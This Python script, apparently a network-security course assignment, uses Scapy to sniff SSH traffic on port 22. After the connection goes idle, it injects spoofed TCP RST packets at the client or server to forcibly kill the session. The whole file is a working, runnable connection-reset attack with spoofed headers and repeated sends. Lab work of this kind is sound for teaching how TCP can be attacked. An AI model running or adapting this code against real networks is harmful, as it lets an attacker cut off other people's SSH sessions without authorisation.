""" 
After Completing Part A, you are supposed to develop a program that will monitor network communication,
and on detecting an established SSH communication, it should wait for the connection to stabilize.
Once stabilized, the program creates a TCP RST packet targeted at either the client or server (user's choice),
to forcibly terminate the connection.
"""

from scapy.all import *  # Importing all functionalities from Scapy for packet manipulation
import time

# Function to craft and send a TCP RST (reset) packet to spoof connection termination
def spoof_tcp(pkt, target):
    if pkt.haslayer(TCP):
        print("[+] Crafting RST packet...")

        # If user chooses to attack the client, reverse source and destination
        if target == "client":
            ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)  # Spoofed IP headers
            tcp_layer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport,
                            flags="R", seq=pkt[TCP].ack)  # RST packet with correct sequence

        # If user chooses to attack the server
        elif target == "server":
            ip_layer = IP(src=pkt[IP].src, dst=pkt[IP].dst)
            tcp_layer = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                            flags="R", seq=pkt[TCP].seq)

        else:
            print("[-] Invalid target.")  # Invalid input handling
            return

        # Combine IP and TCP layers to form the full packet
        rst_pkt = ip_layer / tcp_layer
        print("[+] Sending multiple RST packets...")

        # Send the crafted RST packet multiple times to ensure effectiveness
        for _ in range(5):
            send(rst_pkt, iface="enp0s3", verbose=1)  # Replace "enp0s3" with your interface if different
            time.sleep(0.1)

        print("[+] Spoofed RST packet sent.")
    else:
        print("[-] Packet does not contain TCP layer.")

# Main driver function
def main():
    target = input("Attack Client or Server? (client/server): ").lower()  # User input
    idle_period = 5  # Time to wait with no traffic before triggering RST
    last_pkt = None

    print("Sniffing SSH traffic on port 22...")

    # Start sniffing for SSH packets on port 22
    while True:
        pkts = sniff(iface="enp0s3", filter="tcp and port 22", count=1, timeout=idle_period)
        if pkts:
            last_pkt = pkts[0]  # Save last observed packet
        else:
            break  # No packets seen during the idle period, proceed to spoof

    # If at least one packet was captured
    if last_pkt:
        print("[+] No traffic for idle period. Sending RST packet...")
        spoof_tcp(last_pkt, target)  # Call function to spoof and send the packet
    else:
        print("[-] No SSH traffic captured.")

# Run the main function
if __name__ == "__main__":
    main()
